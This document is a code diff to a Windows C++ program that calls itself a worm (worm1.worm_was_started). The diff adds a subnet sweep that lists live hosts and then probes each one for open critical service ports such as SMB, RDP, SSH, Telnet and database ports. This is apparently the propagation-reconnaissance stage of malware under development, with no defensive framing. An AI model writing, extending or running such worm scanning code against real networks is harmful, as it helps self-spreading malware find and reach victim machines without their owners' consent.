@@ -24,19 +24,55 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 
 	worm1.worm_was_started();
 
-	
-	auto net_info = worm1.get_local_ip_and_subnet();
+	vector<wstring> alive_ip;
+
+
+	auto net_info = get_local_ip_and_subnet();
 	if (net_info.size() == 2)
 	{
 		string ip(net_info[0].begin(), net_info[0].end());
 		string mask(net_info[1].begin(), net_info[1].end());
 
-		auto range = worm1.generate_ip_range(ip, mask);
-		for (const auto& ip_ws : range)
-			wcout << ip_ws << endl;
+		auto range = generate_ip_range(ip, mask);
+		for (const auto& ip_ws : range) {
+			wcout << ip_ws<< " "<< is_host_alive(ip_ws) << endl;
+			if (is_host_alive(ip_ws)) {
+				alive_ip.push_back(ip_ws);
+			}
+		}
 	}
 
-	
+	std::vector<int> critical_and_popular_ports = {
+	21,    // FTP
+	22,    // SSH
+	23,    // Telnet
+	25,    // SMTP
+	53,    // DNS
+	67,    // DHCP
+	68,    // DHCP
+	69,    // TFTP
+	80,    // HTTP
+	123,   // NTP
+	135,   // RPC
+	137,   // NetBIOS
+	138,   // NetBIOS
+	139,   // NetBIOS
+	161,   // SNMP
+	443,   // HTTPS
+	445,   // SMB
+	5000,  // UPnP/DLNA
+	1900,  // SSDP (UPnP)
+	3306,  // MySQL
+	3389,  // RDP
+	5432   // PostgreSQL
+	};
+
+
+	for (wstring &ip : alive_ip) {
+		for (int port : critical_and_popular_ports) {
+			is_port_open(ip, port);
+		}
+	}
 
 
 
